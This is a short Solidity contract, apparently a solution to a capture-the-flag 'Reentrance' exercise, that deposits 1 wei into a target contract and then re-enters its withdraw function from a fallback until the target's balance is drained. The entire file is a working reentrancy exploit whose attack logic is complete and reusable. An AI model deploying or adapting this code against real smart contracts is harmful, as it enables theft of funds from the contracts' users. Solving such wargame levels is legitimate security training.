// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw() external;
}

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // deplosit funds
        IReentrance(contractAddress).donate{value: 1 wei}(address(this));

        // attack!
        IReentrance(contractAddress).withdraw();
    }

    fallback() external payable {
        // check contract balance
        uint256 leftOver = contractAddress.balance;
        if (leftOver >= 1 wei) {
            IReentrance(contractAddress).withdraw();
        }
    }
}
